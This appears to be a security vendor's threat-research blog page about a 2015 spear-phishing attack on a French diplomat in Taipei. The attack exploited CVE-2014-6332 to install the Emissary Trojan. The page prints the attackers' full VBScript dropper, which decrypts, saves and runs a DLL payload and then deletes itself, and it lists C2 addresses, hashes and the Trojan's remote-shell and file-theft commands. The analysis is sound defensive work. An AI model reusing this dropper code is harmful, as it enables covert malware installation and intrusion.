    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'Cortex'){
        article.dataset.type = 'cortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();        
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p>We observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs. The attack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology support group event.</p>
<p>The actors attempted to exploit CVE-2014-6332 using a slightly modified version of the proof-of-concept (POC) code to install a Trojan called Emissary, which is related to the <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/">Operation Lotus Blossom</a> campaign. The TTPs used in this attack also match those detailed in the paper. The targeting of this individual suggests the actors are interested in breaching the French Ministry of Foreign Affairs itself or gaining insights into relations between France and Taiwan.</p>
<p>We have created the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary">Emissary</a> tag for AutoFocus users to track this threat.<span id="more-11536"></span></p>
<h1>En garde!</h1>
<p>On November 10, 2015, threat actors sent a spear-phishing email to an individual at the French Ministry of Foreign Affairs. The subject and the body of the email suggest the targeted individual had been invited to a Science and Technology conference in Hsinchu, Taiwan. The e-mail appears quite timely, as the conference was held on November 13, 2015, which is three days after the attack took place.</p>
<p>The email body contained a link to the legitimate registration page for the conference, but the email also had two attachments with the following filenames that also pertain to the conference:</p>
<ol>
<li>蔡英文柯建銘全國科技後援會邀請函.doc (translates to “Tsai Ker Chien-ming National Science and Technology Support Association invitations.doc”)</li>
<li>書面報名表格.doc (translates to “Written Application Form.doc”)</li>
</ol>
<p>Both attachments are malicious Word documents that attempt to exploit the Windows OLE Automation Array Remote Code Execution Vulnerability tracked by <a href="https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332">CVE-2014-6332</a>. Upon successful exploitation, the attachments will install a Trojan named Emissary and open a Word document as a decoy.</p>
<p>The first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and Technology conference this past November 13th held in Hsingchu, Taiwan, while the second opens a decoy (Figure 1) that is a registration form to attend the conference. The conference was widely advertised online and on Facebook, however in this case the invitation includes a detailed itinerary that does not seem to have appeared online. The Democratic Progressive’s Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representative Ker Chien-ming were the primary political sponsors of the conference and are longtime political allies. Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming may become Speaker if she wins. The conference focused on using open source technology, open international recruiting, and partnerships to continue developing Hsinchu as the Silicon Valley of Taiwan. It particularly noted France as an ally in this, and France is Taiwan’s second largest technology partner and fourth largest trading partner in Europe.</p>
<p><img decoding="async" class="aligncenter size-large wp-image-11538" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/fig1-500x277.png" alt="fig1" width="500" height="277" /></p>
<p style="text-align: center;"><em>Figure 1 Decoy document containing written application form</em></p>
<p><img decoding="async" class="aligncenter size-large wp-image-11539" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/fig2-500x393.png" alt="fig2" width="500" height="393" /></p>
<p style="text-align: center;"><em>Figure 2 Decoy document containing the invitation and agenda for event</em></p>
<h1>Exploiting CVE-2014-6332</h1>
<p>The threat actors attempted to exploit CVE-2014-6332 using the <a href="https://gist.github.com/worawit/77a839e3e5ca50916903">POC code</a> available in the wild. The POC code contains inline comments that explain how the malicious VBScript exploits this vulnerability, so instead of discussing the malicious script or exploit itself, we will focus on the portions of the script that the threat actors modified.</p>
<p>The actors removed the explanatory comments from the VBScript and made slight modifications to the POC code. The only major functional difference between the POC and the VBScript involved adding the ability to extract and run both a decoy document and payload. Figure 3 and 4 compare the differing “runshell” command within the POC and the malicious documents used in this attack. The code in Figure 3 shows that the POC does nothing more than launch the notepad.exe application upon successful exploitation. Figure 4 shows the malicious document creating a file named “ss.vbs” that it writes a VBScript to using a series of “echo” statements. After writing the VBScript, the malicious document executes the “ss.vbs” file.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6719869a6cf9d415036816" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

		<div id="crayon-6719869a6cfa2239847012" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>

			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function runshell()
  On Error Resume Next
  set objshell= Createobject("WScript.Shell")
  strValue = objshell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Local AppData")
  ename = "rundll32"","""""""&amp;strValue&amp;"\mm.dll"""",Setting"
  outfile1= strValue&amp;"\mm.dll"
  bs = strValue&amp;"\ss.vbs"
  dn= strValue&amp;"\t.doc"
  v=window.location.href
  v=Replace(v,"file:///","",1,1,1)
  v=Replace(v,"?.html","",1,1,1)
  v=Replace(v,"%20"," ",1)
  v=Replace(v,"/","\",1)            
  cmd = "cmd"
  arg=" /c taskkill  -f -im winword.exe "
  arg1= ""","""
  set shell=createobject("wscript.shell") 
  shell.run "cmd.exe /c ""echo On Error Resume Next &gt;"""&amp;bs&amp;"""  "" ",0,true  
  shell.run "cmd.exe /c ""echo set shell=createobject(""Shell.Application"") &gt;&gt;"""&amp;bs&amp;"""    "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute ""cmd"","""&amp;arg&amp;""","""","""",0 &gt;&gt;"""&amp;bs&amp;"""        "" ",0,true
  shell.run "cmd.exe /c ""echo wscript.sleep 3000             &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim str                                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim L1                                                                       &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim L2                                                                       &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim Len                                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim infile                                                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim outfile1                                                                 &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim outfile2                                                                 &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo infile = """&amp;v&amp;"""                                                             &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo outfile1 = """&amp;outfile1&amp;"""                                                           &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo outfile2 = """&amp;dn&amp;"""                                                           &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo L1=     78924                                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo L2=     38912                                                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo size=    144893                                                                 &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo offset1 = size-L1-L2                                                         &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo offset2 = size-L2                                                            &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Len=0                                                                        &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo str = ReadBinary (infile,L1,offset1)                                         &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo WriteBinary outfile1, str                                                    &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo str = ReadBinary (infile,L2,offset2)                                         &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo WriteBinary outfile2, str                                                    &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Function ReadBinary(FileName,length,offset)                                  &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Dim Buf(), I                                                               &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   With CreateObject(""ADODB.Stream"")                                        &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset &gt;&gt; """&amp;bs&amp;"""  "" ",0,true 
  shell.run "cmd.exe /c ""echo     Len =length -1                                                           &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     ReDim Buf(Len)                                                           &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if        &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     Next                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Close                                                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   End With                                                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   ReadBinary = Buf                                                           &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo End Function                                                                 &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Sub WriteBinary(FileName, Buf)                                               &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Dim I, aBuf, Size, bStream                                                 &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Size = UBound(Buf): ReDim aBuf(Size \ 2)                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   For I = 0 To Size - 1 Step 2                                               &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo       aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                          &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Next                                                                       &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))                                &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   aBuf=Join(aBuf, """")                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Set bStream = CreateObject(""ADODB.Stream"")                               &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   bStream.Type = 1: bStream.Open                                             &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   With CreateObject(""ADODB.Stream"")                                        &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Type = 2 : .Open: .WriteText aBuf                                       &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Position = 2: .CopyTo bStream: .Close                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   End With                                                                   &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   bStream.SaveToFile FileName, 2: bStream.Close                              &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Set bStream = Nothing                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo End Sub                                                                      &gt;&gt; """&amp;bs&amp;"""  "" ",0,true
  shell.run "cmd.exe /c ""echo set shell=createobject(""Shell.Application"") &gt;&gt;"""&amp;bs&amp;"""    "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute """&amp;dn&amp;""" &gt;&gt;"""&amp;bs&amp;"""               "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute """&amp;ename&amp;""" &gt;&gt;"""&amp;bs&amp;"""               "" ",0,true
  shell.run "cmd.exe /c ""echo Set xa = CreateObject(""Scripting.FileSystemObject"") &gt;&gt;"""&amp;bs&amp;"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo If xa.FileExists("""&amp;bs&amp;""") Then                     &gt;&gt;"""&amp;bs&amp;"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo Set xb = xa.GetFile("""&amp;bs&amp;""")                       &gt;&gt;"""&amp;bs&amp;"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo xb.Delete                                             &gt;&gt;"""&amp;bs&amp;"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo End If                                                &gt;&gt;"""&amp;bs&amp;"""                      "" ",0,true
  shell.run "cmd.exe /c """&amp;bs&amp;"""   ",0,true
end function</textarea></div>

						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6719869a6cfa2239847012-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">runshell</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719869a6cfa2239847012-2"><span class="crayon-h">&nbsp;&nbsp;</span><span id="crayon-6719869a6cfa2239847012-3"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-e">set </span><span class="crayon-i">objshell</span>=<span class="crayon-h"> </span><span class="crayon-e">Createobject</span><span class="crayon-sy">(</span><span class="crayon-s">"WScript.Shell"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719869a6cfa2239847012-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">strValue</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">objshell</span><span class="crayon-sy">.</span><span class="crayon-e">RegRead</span><span class="crayon-sy">(</span><span class="crayon-s">"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Local AppData"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-6719869a6cfa2239847012-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">ename</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span <!-- [Format Time: 0.0036 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure 4 Code block containing "runshell" function in malicious VBScript within attachment</em></p>
<p>The ss.vbs file is responsible for locating the payload and decoy document from the initial malicious document, as well as decrypting, saving and opening both of the files. The script has hardcoded offsets to the location of both the payload and decoy document within the initial document. The script will decrypt both of the embedded files using a two-byte XOR loop that skips the first byte and then decrypts the remaining using “A” and “C” as the key. After decrypting the embedded files, the script saves the decoy to “t.doc” and the payload to “mm.dll” in the “%APPDATA%\LocalData” folder. Finally, the script will open the decoy document and launch the payload by calling its exported function named “Setting”.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

On Error Resume Next    
set shell=createobject("Shell.Application")      
shell.ShellExecute "cmd"," /c taskkill  -f -im winword.exe ","","",0          
wscript.sleep 3000                
dim str                                                                         
dim L1                                                                          
dim L2                                                                          
dim Len                                                                         
dim infile                                                                      
dim outfile1                                                                    
dim outfile2                                                                    
infile = "C:\Documents and Settings\&lt;username&gt;\Desktop\&lt;malicious document name&gt;.doc"                                                               
outfile1 = "C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\mm.dll"                                                              
outfile2 = "C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\t.doc"                                                             
L1=     78924                                                                         
L2=     38912
size=    144893                                                                    
offset1 = size-L1-L2                                                            
offset2 = size-L2                                                               
Len=0                                                                           
str = ReadBinary (infile,L1,offset1)                                            
WriteBinary outfile1, str                                                      
str = ReadBinary (infile,L2,offset2)                                            
WriteBinary outfile2, str                                                       
Function ReadBinary(FileName,length,offset)                                    
  Dim Buf(), I                                                                  
  With CreateObject("ADODB.Stream")                                           
    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset    
    Len =length -1                                                             
    ReDim Buf(Len)                                                              
    For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if           
    Next                         
    .Close                                                                      
  End With                                                                      
  ReadBinary = Buf                                                              
End Function                                                                    
Sub WriteBinary(FileName, Buf)                                                  
  Dim I, aBuf, Size, bStream                                                    
  Size = UBound(Buf): ReDim aBuf(Size \ 2)                                      
  For I = 0 To Size - 1 Step 2                                                  
      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                             
  Next                                                                          
  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))                                   
  aBuf=Join(aBuf, "")                                                         
  Set bStream = CreateObject("ADODB.Stream")                                  
  bStream.Type = 1: bStream.Open                                                
  With CreateObject("ADODB.Stream")                                           
    .Type = 2 : .Open: .WriteText aBuf                                          
    .Position = 2: .CopyTo bStream: .Close                                      
  End With                                                                      
  bStream.SaveToFile FileName, 2: bStream.Close                                 
  Set bStream = Nothing                                                         
End Sub                                                                         
set shell=createobject("Shell.Application")      
shell.ShellExecute "C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\t.doc"                 
shell.ShellExecute "rundll32","""C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\mm.dll"",Setting"                 
Set xa = CreateObject("Scripting.FileSystemObject")                        
If xa.FileExists("C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\ss.vbs") Then                                            
Set xb = xa.GetFile("C:\Documents and Settings\&lt;username&gt;\Local Settings\Application Data\ss.vbs")                                              
xb.Delete                                                                    
End If</textarea></div>

<p></p>
<p style="text-align: center;"><em>Figure 5 VBScript within ss.vbs responsible for extracting and running the payload and decoy</em></p>
<h1>Emissary 5.3 Analysis</h1>
<p>The payload of this attack is a Trojan that we track with the name Emissary. This Trojan is related to the Elise backdoor described in the <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/">Operation Lotus Blossom</a> report. Both Emissary and Elise are part of a malware group referred to as “LStudio”, which is based on the following debug strings found in Emissary and Elise samples:</p>
<p>d:\lstudio\projects\worldclient\emissary\Release\emissary\i386\emissary.pdb</p>
<p>d:\lstudio\projects\lotus\elise\Release\EliseDLL\i386\EliseDLL.pdb</p>
<p>There is code overlap between Emissary and Elise, specifically in the use of a common function to log debug messages to a file and a custom algorithm to decrypt the configuration file. The custom algorithm used by Emissary and Elise to decrypt their configurations use the “srand” function to set a seed value for the “rand” function, which the algorithm uses to generate a key. While the “rand” function is meant to generate random numbers, the malware author uses the “srand” function to seed the “rand” function with a static value. The static seed value causes the “rand” function to create the same values each time it is called and results in a static key to decrypt the configuration. The seed value is where the Emissary and Elise differ in their use of this algorithm, as Emissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012.</p>
<p><img decoding="async" class=" wp-image-11544 size-full aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/fig6-1.png" alt="fig6" width="410" height="114" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/fig6-1.png 410w, https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/fig6-1-300x83.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/fig6-1-370x103.png 370w" sizes="(max-width: 410px) 100vw, 410px" /></p>
<p style="text-align: center;"><em>Figure 6 Custom algorithm in Emissary using 'srand' and 'rand' with 1024 as a seed value</em></p>
<p>While these two Trojans share code, we consider Emissary and Elise separate tools since their configuration structure, command handler and C2 communications channel differ. The Emissary Trojan delivered in this attack contains the components listed in Table 1. At a high level, Emissary has an initial loader DLL that extracts a configuration file and a second DLL containing Emissary’s functional code that it injects into Internet Explorer.</p>
<table>
<tbody>
<tr>
<td width="178"><strong>MD5</strong></td>
<td width="183"><strong>Path</strong></td>
<td width="82"><strong>Description</strong></td>
</tr>
<tr>
<td width="178">06f1d2be5e981dee056c231d184db908</td>
<td width="183">%APPDATA%\LocalData\ishelp.dll</td>
<td width="82">Loader</td>
</tr>
<tr>
<td width="178">6278fc8c7bf14514353797b229d562e8</td>
<td width="183">%APPDATA%\LocalData\A08E81B411.DAT</td>
<td width="82">Emissary Payload</td>
</tr>
<tr>
<td width="178">e9f51a4e835929e513c3f30299567abc</td>
<td width="183">%APPDATA%\LocalData\75BD50EC.DAT</td>
<td width="82">Configuration file</td>
</tr>
<tr>
<td width="178">varies</td>
<td width="183">%TEMP%\000A758C8FEAE5F.TMP</td>
<td width="82">Log file</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 1 Dropped files associated with Emissary Trojan seen in attack on French Ministry of Foreign Affairs</em></p>
<p>The loader Trojan named “ishelp.dll” had an original name of “Loader.dll”, which will extract the Emissary payload from a resource named "asdasdasdasdsad" and write it to a file named “A08E81B411.DAT”. The loader will then write an embedded configuration to a file named “75BD50EC.DAT”. The loader Trojan creates a mutex named “_MICROSOFT_LOADER_MUTEX_” and finishes by injecting the Emissary DLL in “A08E81B411.DAT” into a newly spawned Internet Explorer process.</p>
<p>The Emissary Trojan runs within the Internet Explorer process. It begins by reading and decrypting its configuration file, which has the following structure:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6719869a6cfa6377574086" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>

			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">

WORD emissary_version_minor;
CHAR[36] GUID_for_sample;

				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">

				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719869a6cfa6377574086-10"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">550</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">Unknown2</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-6719869a6cfa6377574086-11"><span class="crayon-t">WORD</span><span class="crayon-h"> </span><span class="crayon-i">Delay_interval_seconds</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719869a6cfa6377574086-12"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>We decrypted and parsed the configuration file that accompanied the payload used in this attack, which resulted in the following settings:</p>
<p>Version: 5.3<br />
GUID: ba87c1c5-f71c-4a8b-b511-07aa113d9103<br />
C2 Server 1: http://ustar5.PassAs[.]us/default.aspx<br />
C2 Server 2: http://203.124.14.229/default.aspx<br />
C2 Server 3: http://dnt5b.myfw[.]us/default.aspx<br />
Campaign Code: UPG-ZHG-01<br />
Sleep Delay: 300</p>
<p>After decrypting the configuration file, Emissary interacts with its command and control (C2) servers using HTTP or HTTPS, depending on the protocol specified in the configuration file. The initial network beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie field that contains a “GUID”, “op” and “SHO” field. The GUID field is a unique identifier for the compromised system that is obtained directly from the configuration file. The op field has a value of “101”, which is a static value that represents the initial network beacon. The SHO field contains the external IP address of the infected system, which Emissary obtains from a legitimate website “showip.net”, specifically parsing the website’s response for ‘&lt;input id="checkip" type="text" name="check_ip" value=’, which contains the IP address of the system.</p>
<p><img decoding="async" class="aligncenter size-large wp-image-11545" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/fig7-500x120.png" alt="fig7" width="500" height="120" /></p>
<p style="text-align: center;"><em>Figure 7 Network beacon sent from Emissary Trojan to C2 server</em></p>
<p>The C2 server response to this beacon (seen in Figure 8) will contain a header field called “Set-Cookie”, which contains a value of “SID”. The SID value is base64 encoded and encrypted using a rolling XOR algorithm, which once decoded and decrypted contains a 36-character GUID value. The Emissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will use to encrypt data sent in subsequent network communications.</p>
<p><img decoding="async" class="aligncenter size-large wp-image-11546" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/fig8-500x174.png" alt="fig8" width="500" height="174" /></p>
<p style="text-align: center;"><em>Figure 8 C2 response to Emissary beacon</em></p>
<p>The C2 server provides commands to the Trojan as a three digit numeric string within the data portion of the HTTP response (in the form of “op=&lt;command&gt;”), which the Emissary Trojan will decrypt and compare to a list of commands within its command handler. The command handler function within the Emissary Trojan supports six commands, as seen in Table 2.</p>
<table>
<tbody>
<tr>
<td width="221"><strong>Command</strong></td>
<td width="221"><strong>Description</strong></td>
</tr>
<tr>
<td width="221">102</td>
<td width="221">Upload a file to the C2 server.</td>
</tr>
<tr>
<td width="221">103</td>
<td width="221">Executes a specified command.</td>
</tr>
<tr>
<td width="221">104</td>
<td width="221">Download file from the C2 server.</td>
</tr>
<tr>
<td width="221">105</td>
<td width="221">Update configuration file.</td>
</tr>
<tr>
<td width="221">106</td>
<td width="221">Create a remote shell.</td>
</tr>
<tr>
<td width="221">107</td>
<td width="221">Updates the Trojan with a new executable.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 2 Command handler within Emissary version 5.3</em></p>
<p>If the command issued from the C2 server does not match the one listed in the Trojan saves the message "unkown:%s" to the log file. The command set available within Emissary allows the threat actors backdoor access to a compromised system. Using this access, the threat actors can exfiltrate data and carry out further activities on the system, including interacting directly with the system’s command shell and downloading and executing additional tools for further functionality.</p>
<h1>Threat Infrastructure</h1>
